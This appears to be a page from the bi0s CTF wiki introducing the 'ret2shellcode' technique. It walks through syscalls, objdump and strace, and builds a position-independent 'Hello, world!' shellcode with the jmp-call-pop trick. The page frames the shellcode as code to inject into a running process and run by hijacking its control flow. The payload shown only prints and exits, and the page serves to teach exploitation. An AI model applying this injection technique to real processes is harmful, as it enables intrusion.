{% extends "bi0s_main.html" %}
{% block title %}
<title>ret2shellcode - bi0s wiki</title>
{% endblock %}
{% block content %}
{% load static %}
<div class="md-content">
<article class="md-content__inner md-typeset">
<a href="https://gitlab.com/teambi0s/bi0s-wiki/blob/master/docs/pwning/stack-overflow/return-to-shellcode.md" title="Edit this page" class="md-icon md-content__icon"></a><img name="kl_1567871733074" style="width: 12px; height: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsSAAALEgHS3X78AAAB3ElEQVQ4jY2TPWhTURTH/+e8l7QNJg0qCJpCSdEnONTFDk5udfILs9mS6iJYpI4VnURXUcRJrFG3gm3tXLpIxaUUIVA/iLRJayQ2Nk1q7cu99zjUF/JhQv7jOff/O+fcwyERAQAQEaoVjsdOirgP93L+W5svJpeq8xVfPWD/yPkepekBWbjETl8nM0h9XtkRV72xLbmdn5hJ/xdw4OaVkC6U7oBwg6MRH0d7fGTbQDoLIYKUXa2/rO5C6SdWOHh/4/HrLQCwvZZUoZi2Dh/ysdPbRZ0dNeOQCMj2WXTiaMCUtsdUKn0dQHcNAEZCVr+DViJjYAW6/NqI34txS0eVIqEwRgfONMTbApyORDE3PIbF9dX2AKPHTyESCFbMExeGMTL9EguZVHuAxY3vmBscwtkjfS3NTQELuQzi72bwaGAQ8elEUzNQtQUiLsmf3X3eCt/n1uBMPQUy2bqSDCIuNXQgjHnJ5kzTUt47rUQY8w0AG2ZcLX/bkc2t5m5mlJdTv22Y8QZAPjGbBPHl8oePRb2yruu9BjBu8msRGrF8YjZZGb3+mA5ePee4ip9xoKOfj/UGSRuYtR/b+ldxyW/paz+fv/0EtLhGT91DF2NgubtXnu4VXk1N1vzFP99f037PUFbu4yIAAAAASUVORK5CYII=" width="12" height="12">
<h1>ret2shellcode</h1>
<h2 id="shellcode">Shellcode<a class="headerlink" href="#shellcode" title="Permanent link">¶</a></h2>
<div class="superfences-tabs">
<input name="__tabs_1" type="radio" id="__tab_1_0" checked="checked">
<label for="__tab_1_0">hello_world.c</label>
<div class="superfences-content"><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="codehilite" id="__code_0"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_0 pre, #__code_0 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="cm">/* hello_world.c */</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"HelloWorld !</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></tbody></table></div>
</div>
<p>The computer can't understand high level languages , it can only 
understand machine level language which is 1 and 0 , so we made a 
software which convert our human understandable language in to machine 
code , called the compiler .</p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_1"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_1 pre, #__code_1 code"><span class="md-clipboard__message"></span></button><pre><span></span>gcc  hello_world.c -o hello_world
</pre></div>
</td></tr></tbody></table>
<p>When you compile the above code what the compiler does is that it 
translate the above logic into machine level instructions which can be 
directly executed by the computer.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>objdump is a tool used to view information about a ELF file . </p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite" id="__code_2"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_2 pre, #__code_2 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="o">-</span><span class="n">D</span> <span class="p">:</span>  <span class="k">option</span> <span class="n">tells</span> <span class="n">the</span> <span class="n">tool</span> <span class="k">to</span> <span class="n">disassemble</span> <span class="n">the</span> <span class="nb">binary</span> <span class="n">information</span> <span class="n">stored</span> <span class="n">insde</span> <span class="n">the</span> 
      <span class="n">executable</span> <span class="k">and</span> <span class="n">print</span> <span class="n">it</span> <span class="k">in</span> <span class="n">assembly</span> <span class="k">language</span>
<span class="o">-</span><span class="n">M</span> <span class="p">:</span>  <span class="n">specifies</span> <span class="n">which</span> <span class="n">systax</span> <span class="n">should</span> <span class="n">the</span> <span class="n">assembly</span> <span class="n">should</span> <span class="n">follow</span> <span class="p">(</span> <span class="k">default</span> <span class="k">is</span> <span class="k">AT</span><span class="o">&amp;</span><span class="n">T</span> <span class="p">)</span>
</pre></div>
</td></tr></tbody></table>
</div>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_3"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_3 pre, #__code_3 code"><span class="md-clipboard__message"></span></button><pre><span></span>objdump -D -M intel hello_world 
</pre></div>
</td></tr></tbody></table>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="codehilite" id="__code_4"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_4 pre, #__code_4 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="w">    </span><span class="p">...</span><span class="w"></span>
<span class="w">    </span><span class="p">...</span><span class="w"></span>
<span class="w">    </span><span class="mi">00000000000006</span><span class="n">b0</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span><span class="err">:</span><span class="w"></span>
<span class="w">     </span><span class="mi">6</span><span class="nl">b0</span><span class="p">:</span><span class="w">   </span><span class="mi">55</span><span class="w">                      </span><span class="n">push</span><span class="w">   </span><span class="n">rbp</span><span class="w"></span>
<span class="w">     </span><span class="mi">6</span><span class="nl">b1</span><span class="p">:</span><span class="w">   </span><span class="mi">48</span><span class="w"> </span><span class="mi">89</span><span class="w"> </span><span class="n">e5</span><span class="w">                </span><span class="n">mov</span><span class="w">    </span><span class="n">rbp</span><span class="p">,</span><span class="n">rsp</span><span class="w"></span>
<span class="w">     </span><span class="mi">6</span><span class="nl">b4</span><span class="p">:</span><span class="w">   </span><span class="mi">48</span><span class="w"> </span><span class="mi">83</span><span class="w"> </span><span class="n">ec</span><span class="w"> </span><span class="mi">10</span><span class="w">             </span><span class="n">sub</span><span class="w">    </span><span class="n">rsp</span><span class="p">,</span><span class="mh">0x10</span><span class="w"></span>
<span class="w">     </span><span class="mi">6</span><span class="nl">b8</span><span class="p">:</span><span class="w">   </span><span class="mi">89</span><span class="w"> </span><span class="mi">7</span><span class="n">d</span><span class="w"> </span><span class="n">fc</span><span class="w">                </span><span class="n">mov</span><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="o">[</span><span class="n">rbp-0x4</span><span class="o">]</span><span class="p">,</span><span class="n">edi</span><span class="w"></span>
<span class="w">     </span><span class="mi">6</span><span class="nl">bb</span><span class="p">:</span><span class="w">   </span><span class="mi">48</span><span class="w"> </span><span class="mi">89</span><span class="w"> </span><span class="mi">75</span><span class="w"> </span><span class="n">f0</span><span class="w">             </span><span class="n">mov</span><span class="w">    </span><span class="n">QWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="o">[</span><span class="n">rbp-0x10</span><span class="o">]</span><span class="p">,</span><span class="n">rsi</span><span class="w"></span>
<span class="w">     </span><span class="mi">6</span><span class="nl">bf</span><span class="p">:</span><span class="w">   </span><span class="mi">48</span><span class="w"> </span><span class="mi">8</span><span class="n">d</span><span class="w"> </span><span class="mi">3</span><span class="n">d</span><span class="w"> </span><span class="mi">9</span><span class="n">e</span><span class="w"> </span><span class="mi">00</span><span class="w"> </span><span class="mi">00</span><span class="w"> </span><span class="mi">00</span><span class="w">    </span><span class="n">lea</span><span class="w">    </span><span class="n">rdi</span><span class="p">,</span><span class="o">[</span><span class="n">rip+0x9e</span><span class="o">]</span><span class="w">        </span><span class="err">#</span><span class="w"> </span><span class="mi">764</span><span class="w"> </span><span class="o">&lt;</span><span class="n">_IO_stdin_used</span><span class="o">+</span><span class="mh">0x4</span><span class="o">&gt;</span><span class="w"></span>
<span class="w">     </span><span class="mi">6</span><span class="nl">c6</span><span class="p">:</span><span class="w">   </span><span class="n">e8</span><span class="w"> </span><span class="mi">95</span><span class="w"> </span><span class="n">fe</span><span class="w"> </span><span class="n">ff</span><span class="w"> </span><span class="n">ff</span><span class="w">          </span><span class="k">call</span><span class="w">   </span><span class="mi">560</span><span class="w"> </span><span class="o">&lt;</span><span class="n">puts</span><span class="nv">@plt</span><span class="o">&gt;</span><span class="w"></span>
<span class="w">     </span><span class="mi">6</span><span class="nl">cb</span><span class="p">:</span><span class="w">   </span><span class="n">b8</span><span class="w"> </span><span class="mi">00</span><span class="w"> </span><span class="mi">00</span><span class="w"> </span><span class="mi">00</span><span class="w"> </span><span class="mi">00</span><span class="w">          </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span><span class="w"></span>
<span class="w">     </span><span class="mi">6</span><span class="nl">d0</span><span class="p">:</span><span class="w">   </span><span class="n">c9</span><span class="w">                      </span><span class="n">leave</span><span class="w"></span>
<span class="w">     </span><span class="mi">6</span><span class="nl">d1</span><span class="p">:</span><span class="w">   </span><span class="n">c3</span><span class="w">                      </span><span class="n">ret</span><span class="w"></span>
<span class="w">     </span><span class="p">...</span><span class="w"></span>
<span class="w">     </span><span class="p">...</span><span class="w"></span>
</pre></div>
</td></tr></tbody></table>
<p>Even if you write code in Assembly language it can't be directly 
executed by the computer , it should be again translated into machine 
level instruction which only consist of 1 and 0 , As you see in the 
above code the first assembly instruction of our main is <code>push rbp</code> which is the assembly representation of <code>0x55</code> or <code>1010101</code> , this is what our computer actually understand and executes .</p>
<p>When you execute this binary it will be copied to the memory , and 
the computer will execute it's instruction one by one by reading from 
the memory .
</p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="codehilite" id="__code_5"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_5 pre, #__code_5 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="err">┌──────────┐</span>     <span class="err">┌──────────┐</span>     <span class="err">┌────────────┐</span>
<span class="err">│</span>  <span class="k">fetch</span>   <span class="err">│</span>  <span class="err">─</span><span class="o">&gt;</span> <span class="err">│</span>  <span class="n">decode</span>  <span class="err">│</span>  <span class="err">─</span><span class="o">&gt;</span> <span class="err">│</span>   <span class="k">execute</span>  <span class="err">│</span> 
<span class="err">└──────────┘</span>     <span class="err">└──────────┘</span>     <span class="err">└────────────┘</span>
   <span class="o">^</span>                  <span class="o">^</span>                  <span class="o">^</span>
   <span class="err">│</span>                  <span class="err">│</span>                  <span class="err">│</span><span class="n">_</span> <span class="n">the</span> <span class="k">operation</span> <span class="k">is</span> <span class="n">performed</span><span class="p">.</span>
   <span class="err">│</span>                  <span class="err">│</span><span class="n">_</span> <span class="n">computer</span> <span class="n">understands</span> <span class="n">which</span> <span class="k">operation</span> <span class="k">is</span> <span class="k">to</span> <span class="n">be</span> <span class="n">performed</span><span class="p">.</span>
   <span class="err">│</span><span class="n">_</span> <span class="n">one</span> <span class="n">instruction</span> <span class="k">is</span> <span class="n">fetched</span> <span class="k">from</span> <span class="n">the</span> <span class="n">memory</span><span class="p">.</span>
</pre></div>
</td></tr></tbody></table><p></p>
<p>What if we were able to inject own our code into the memory of a 
process and change it's control flow to execute that code . We can make 
the process do some weird stuffs . But we can't write that logic in C or
 in assembly and write that to memory . We should encode our assembly 
instruction to machine code and use that .</p>

<h3 id="hello-world">Hello World<a class="headerlink" href="#hello-world" title="Permanent link">¶</a></h3>
<p>Let's write Assembly code which prints "Hello world" .</p>
<p>Earlier we used the C library function called the printf to print the
 data into the screen , Which is not a valid possibility since we are 
programming in the assembly .</p>
<div class="admonition note">
<p class="admonition-title">Syscall</p>
<p>The kernel of an Operating System is responsible of managing all the 
low level stuffs and it provides the programmers an interface to 
manipulate them , Syscalls call is a programmatic way in which the 
program requests a service from the Operating System's kernel . This may
 include accessing the hard disk , writing to the screen or reading from
 a file etc …</p>
</div>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_6"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_6 pre, #__code_6 code"><span class="md-clipboard__message"></span></button><pre><span></span>$  strace ./hello_world
</pre></div>
</td></tr></tbody></table>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="codehilite" id="__code_7"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_7 pre, #__code_7 code"><span class="md-clipboard__message"></span></button><pre><span></span>    execve<span class="o">(</span><span class="s2">"./hello_world"</span>, <span class="o">[</span><span class="s2">"./hello_world"</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">56</span> vars */<span class="o">])</span> <span class="o">=</span> <span class="m">0</span>
    brk<span class="o">(</span>NULL<span class="o">)</span>                               <span class="o">=</span> 0x55f1ee7c5000
    access<span class="o">(</span><span class="s2">"/etc/ld.so.nohwcap"</span>, F_OK<span class="o">)</span>      <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
    mmap<span class="o">(</span>NULL, <span class="m">12288</span>, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, <span class="m">0</span><span class="o">)</span> <span class="o">=</span> 0x7f5a2c5b4000
    ...
    ...
    munmap<span class="o">(</span>0x7f5a2c585000, <span class="m">191761</span><span class="o">)</span>          <span class="o">=</span> <span class="m">0</span>
    fstat<span class="o">(</span><span class="m">1</span>, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR<span class="p">|</span><span class="m">0620</span>, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span><span class="m">136</span>, <span class="m">0</span><span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
    brk<span class="o">(</span>NULL<span class="o">)</span>                               <span class="o">=</span> 0x55f1ee7c5000
    brk<span class="o">(</span>0x55f1ee7e6000<span class="o">)</span>                     <span class="o">=</span> 0x55f1ee7e6000
<span class="hll">    write<span class="o">(</span><span class="m">1</span>, <span class="s2">"HelloWorld !\n"</span>, 13HelloWorld !
</span>    <span class="o">)</span>          <span class="o">=</span> <span class="m">13</span>
    exit_group<span class="o">(</span><span class="m">0</span><span class="o">)</span>                           <span class="o">=</span> ?
</pre></div>
</td></tr></tbody></table>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><code>strace</code> is a tools which can be used to display the syscalls used by a program .</p>
</div>
<p>As you can see, the compiled program does more than just print a 
string. The system calls at the start are setting up the environment and
 memory for the program, but the important part is the write() syscall .
 This is what actually outputs the string.</p>
<p>The Unix manual pages are separated into sections. Section 2 contains the manual pages for system calls, so <code>man 2 write</code> will describe the use of the write() system call:</p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="codehilite" id="__code_8"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_8 pre, #__code_8 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="nv">WRITE</span><span class="ss">(</span><span class="mi">2</span><span class="ss">)</span>                                                     <span class="nv">Linux</span> <span class="nv">Programmer</span><span class="s1">'</span><span class="s">s Manual                                                     WRITE(2)</span>

<span class="nv">NAME</span>
       <span class="nv">write</span> <span class="o">-</span> <span class="nv">write</span> <span class="nv">to</span> <span class="nv">a</span> <span class="nv">file</span> <span class="nv">descriptor</span>

<span class="nv">SYNOPSIS</span>
       #<span class="k">include</span> <span class="o">&lt;</span><span class="nv">unistd</span>.<span class="nv">h</span><span class="o">&gt;</span>

       <span class="nv">ssize_t</span> <span class="nv">write</span><span class="ss">(</span><span class="nv">int</span> <span class="nv">fd</span>, <span class="nv">const</span> <span class="nv">void</span> <span class="o">*</span><span class="nv">buf</span>, <span class="nv">size_t</span> <span class="nv">count</span><span class="ss">)</span><span class="c1">;</span>

<span class="nv">DESCRIPTION</span>
       <span class="nv">write</span><span class="ss">()</span> <span class="nv">writes</span> <span class="nv">up</span> <span class="nv">to</span> <span class="nv">count</span> <span class="nv">bytes</span> <span class="nv">from</span> <span class="nv">the</span> <span class="nv">buffer</span> <span class="nv">pointed</span> <span class="nv">buf</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">file</span> <span class="nv">referred</span> <span class="nv">to</span> <span class="nv">by</span> <span class="nv">the</span> <span class="nv">file</span> <span class="nv">descriptor</span> <span class="nv">fd</span>.
</pre></div>
</td></tr></tbody></table>
<p>The strace output also shows the arguments for the syscall. The buf 
and count arguments are a pointer to our string and its length. The fd 
argument 1 is a special standard file descriptor. File descriptors are 
used for almost everything in Unix: input, output, file access, network 
sockets, and so on. A file descriptor is a indicator used to access a 
opened file or other input/output resource. The first three file 
descriptor numbers (0, 1, and 2) are automatically used for standard 
input, output, and error. so if you open a new file the unique number is
 used to refer that opened file and that number is called a file 
discriptor.</p>
<p>Writing bytes to standard output’s file descriptor of 1 will print 
the bytes; reading from standard input’s file descriptor of 0 will input
 bytes. The standard error file descriptor of 2 is used to display the 
error or debugging messages that can be filtered from the standard 
output.</p>
<p>In linux all the syscalls are referred with a predefined number and 
the arguments to the syscalls are placed on to the registers. How 
syscalls are called will be different for 32bit and 64 bit , So we will 
be focusing on 32 bit shellcode.</p>
<p>On 32 bit x86 Architecture a syscall is called by the <code>int x80</code> instuction . it will call the syscall which corresponds to the number stored in the <code>eax</code> register , and the arguments are passed through <code>ebx</code> , <code>ecx</code> , <code>edx</code> registers .</p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></div></td><td class="code"><div class="codehilite" id="__code_9"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_9 pre, #__code_9 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="k">section </span><span class="nv">.text</span>                     <span class="c1">; Text segment</span>
<span class="k">global </span><span class="nv">_start</span>                     <span class="c1">; Default entry point for ELF linking</span>


<span class="nl">_start:</span>
<span class="nf">jmp</span> <span class="nv">gotoCall</span>                      <span class="c1">; Jump to gotCall</span>

<span class="nl">shellcode:</span>
<span class="c1">; SYSCALL: write(1,msg,14)</span>
<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">4</span>                        <span class="c1">; Put 4 into eax, since write is syscall #4.</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mi">1</span>                        <span class="c1">; Put 1 into ebx, since stdout is 1.</span>
<span class="nf">pop</span> <span class="nb">ecx</span>                           <span class="c1">; Pop the Address of hello world from the stack</span>
<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">14</span>                       <span class="c1">; Put 14 into edx, since our string is 14 bytes.</span>
<span class="nf">int</span> <span class="mh">0x80</span>                          <span class="c1">; Call the kernel to make the system call happen.</span>


<span class="c1">; SYSCALL: exit(0)</span>
<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>                        <span class="c1">; Put 1 into eax, since exit is syscall #1.</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mi">0</span>                        <span class="c1">; Exit with success.</span>
<span class="nf">int</span> <span class="mh">0x80</span>                          <span class="c1">; Do the syscall.</span>

<span class="nl">gotoCall:</span>
<span class="nf">call</span> <span class="nv">shellcode</span>                <span class="c1">; Pushes the address of string to stack</span>
<span class="kd">db</span> <span class="s">"Hello, world!"</span><span class="p">,</span> <span class="mh">0x0a</span>      <span class="c1">; The string and newline char</span>
</pre></div>
</td></tr></tbody></table>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite" id="__code_10"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_10 pre, #__code_10 code"><span class="md-clipboard__message"></span></button><pre><span></span>$ nasm -f elf hello_world.asm
$ ld -m elf_i386  hello_world.o
$ ./a.out
</pre></div>
</td></tr></tbody></table>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>nasm is a assembler , which converts the assembly program into machine understanding binary format.
ld is used to create a executable from the output of the nasm tool.</p>
</div>
<p>The above assembly code prints "Hello, world!" and exits gracefully .
 We should avoid any code which produces absolute address since these 
shellcode will be injected to a running process and any reference it 
previously had will be invalid , So to get the address of the string 
hello world we will first jump the <code>gotoCall</code> section and it 
contains a call instruction which will push the address of the next 
instruction to stack which will be the address of our string and jump to
 the shellcode section , now we can pop that address from the stack We 
can use objdump to extract the converted machine instructions.</p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_11"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_11 pre, #__code_11 code"><span class="md-clipboard__message"></span></button><pre><span></span>$ objdump -D -M intel a.out
</pre></div>
</td></tr></tbody></table>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27</pre></div></td><td class="code"><div class="codehilite" id="__code_12"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_12 pre, #__code_12 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="nf">...</span>
<span class="nf">...</span>
<span class="err">08048060</span> <span class="err">&lt;</span><span class="nf">_start</span><span class="o">&gt;</span><span class="p">:</span>
 <span class="err">8048060:</span>       <span class="nf">eb</span> <span class="mi">1</span><span class="nv">e</span>                   <span class="nv">jmp</span>    <span class="mi">8048080</span> <span class="o">&lt;</span><span class="nv">gotoCall</span><span class="o">&gt;</span>

<span class="err">08048062</span> <span class="err">&lt;</span><span class="nf">shellcode</span><span class="o">&gt;</span><span class="p">:</span>
 <span class="err">8048062:</span>       <span class="nf">b8</span> <span class="mi">04</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x4</span>
 <span class="err">8048067:</span>       <span class="nf">bb</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="nv">mov</span>    <span class="nb">ebx</span><span class="p">,</span><span class="mh">0x1</span>
 <span class="err">804806</span><span class="nl">c:</span>       <span class="err">59</span>                      <span class="nf">pop</span>    <span class="nb">ecx</span>
 <span class="err">804806</span><span class="nl">d:</span>       <span class="nf">ba</span> <span class="mi">0</span><span class="nv">e</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="mh">0xe</span>
 <span class="err">8048072:</span>       <span class="nf">cd</span> <span class="mi">80</span>                   <span class="nv">int</span>    <span class="mh">0x80</span>
 <span class="err">8048074:</span>       <span class="nf">b8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x1</span>
 <span class="err">8048079:</span>       <span class="nf">bb</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="nv">mov</span>    <span class="nb">ebx</span><span class="p">,</span><span class="mh">0x0</span>
 <span class="err">804807</span><span class="nl">e:</span>       <span class="nf">cd</span> <span class="mi">80</span>                   <span class="nv">int</span>    <span class="mh">0x80</span>

<span class="err">08048080</span> <span class="err">&lt;</span><span class="nf">gotoCall</span><span class="o">&gt;</span><span class="p">:</span>
 <span class="err">8048080:</span>       <span class="nf">e8</span> <span class="nv">dd</span> <span class="nv">ff</span> <span class="nv">ff</span> <span class="nv">ff</span>          <span class="nv">call</span>   <span class="mi">8048062</span> <span class="o">&lt;</span><span class="nv">shellcode</span><span class="o">&gt;</span>
 <span class="err">8048085:</span>       <span class="err">48</span>                      <span class="nf">dec</span>    <span class="nb">eax</span>                                    <span class="err">─</span>
 <span class="err">8048086:</span>       <span class="err">65</span> <span class="err">6</span><span class="nf">c</span>                   <span class="nb">gs</span> <span class="nv">ins</span> <span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="nb">es</span><span class="p">:[</span><span class="nb">edi</span><span class="p">],</span><span class="nb">dx</span>                    <span class="err">│</span>
 <span class="err">8048088:</span>       <span class="err">6</span><span class="nf">c</span>                      <span class="nv">ins</span>    <span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="nb">es</span><span class="p">:[</span><span class="nb">edi</span><span class="p">],</span><span class="nb">dx</span>                    <span class="err">│</span>
 <span class="err">8048089:</span>       <span class="err">6</span><span class="nf">f</span>                      <span class="nv">outs</span>   <span class="nb">dx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="nb">ds</span><span class="p">:[</span><span class="nb">esi</span><span class="p">]</span>                   <span class="err">│</span>  <span class="s">"Hello, world!"</span>
 <span class="err">804808</span><span class="nl">a:</span>       <span class="err">2</span><span class="nf">c</span> <span class="mi">20</span>                   <span class="nv">sub</span>    <span class="nb">al</span><span class="p">,</span><span class="mh">0x20</span>                                 <span class="err">│</span>
 <span class="err">804808</span><span class="nl">c:</span>       <span class="err">77</span> <span class="err">6</span><span class="nf">f</span>                   <span class="nv">ja</span>     <span class="mi">80480</span><span class="nv">fd</span> <span class="o">&lt;</span><span class="nv">gotoCall</span><span class="err">╷</span><span class="mh">0x7d</span><span class="o">&gt;</span>                 <span class="err">│</span>
 <span class="err">804808</span><span class="nl">e:</span>       <span class="err">72</span> <span class="err">6</span><span class="nf">c</span>                   <span class="nv">jb</span>     <span class="mi">80480</span><span class="nv">fc</span> <span class="o">&lt;</span><span class="nv">gotoCall</span><span class="err">╵</span><span class="mh">0x7c</span><span class="o">&gt;</span>                 <span class="err">│</span>
 <span class="err">8048090:</span>       <span class="err">64</span> <span class="err">21</span> <span class="err">0</span><span class="nf">a</span>                <span class="nv">and</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="nb">fs</span><span class="p">:[</span><span class="nb">edx</span><span class="p">],</span><span class="nb">ecx</span>                 <span class="err">─</span>
 <span class="nf">...</span>
 <span class="nf">...</span>
</pre></div>
</td></tr></tbody></table>
<p>The resultant shellcode is</p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_13"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_13 pre, #__code_13 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="err">"\</span><span class="nf">xeb</span><span class="err">\</span><span class="nv">x1e</span><span class="err">\</span><span class="nv">xb8</span><span class="err">\</span><span class="nv">x04</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">xbb</span><span class="err">\</span><span class="nv">x01</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x59</span><span class="err">\</span><span class="nv">xba</span><span class="err">\</span><span class="nv">x0e</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">xcd</span><span class="err">\</span><span class="nv">x80</span><span class="err">\</span><span class="nv">xb8</span><span class="err">\</span><span class="nv">x01</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">xbb</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">xcd</span><span class="err">\</span><span class="nv">x80</span><span class="err">\</span><span class="nv">xe8</span><span class="err">\</span><span class="nv">xdd</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">x48</span><span class="err">\</span><span class="nv">x65</span><span class="err">\</span><span class="nv">x6c</span><span class="err">\</span><span class="nv">x6c</span><span class="err">\</span><span class="nv">x6f</span><span class="err">\</span><span class="nv">x2c</span><span class="err">\</span><span class="nv">x20</span><span class="err">\</span><span class="nv">x77</span><span class="err">\</span><span class="nv">x6f</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x6c</span><span class="err">\</span><span class="nv">x64</span><span class="err">\</span><span class="nv">x21</span><span class="err">\</span><span class="nv">x0a</span><span class="err">"</span>
</pre></div>
</td></tr></tbody></table>
